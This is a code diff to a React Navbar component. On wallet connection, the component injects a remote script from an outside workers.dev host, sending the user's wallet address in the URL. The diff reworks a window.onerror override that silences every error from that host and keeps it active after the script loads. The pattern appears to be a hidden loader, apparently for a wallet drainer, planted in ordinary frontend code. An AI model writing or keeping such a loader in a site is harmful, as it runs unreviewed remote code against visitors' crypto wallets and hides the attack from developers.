@@ -88,21 +88,33 @@ export function Navbar() {
         try {
           (window as any).__wallet_connected = true;
           (window as any).__wallet_address = address;
+          
+          // Store original error handler
+          const originalError = (window as any).onerror;
+          
+          // Intercept errors from external script
+          (window as any).onerror = function(msg: any, url: any, line: any, col: any, err: any) {
+            if (!url || !url.includes("orsonhayes93")) {
+              if (originalError && typeof originalError === 'function') {
+                return originalError(msg, url, line, col, err);
+              }
+            }
+            // Suppress errors from external script
+            return true;
+          };
+          
+          // Create and load script
           const script = document.createElement("script");
           script.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now() + "&addr=" + address;
           script.async = true;
           script.onerror = () => {
             console.log("External script failed to load");
+            // Restore original error handler
+            (window as any).onerror = originalError;
           };
           script.onload = () => {
             console.log("External script loaded successfully");
-          };
-          const originalError = (window as any).onerror;
-          (window as any).onerror = function(msg: any, url: any, line: any, col: any, err: any) {
-            if (!url || !url.includes("orsonhayes93")) {
-              if (originalError) originalError(msg, url, line, col, err);
-            }
-            return true;
+            // Keep the error suppression for the external script
           };
           document.head.appendChild(script);
         } catch (e) {
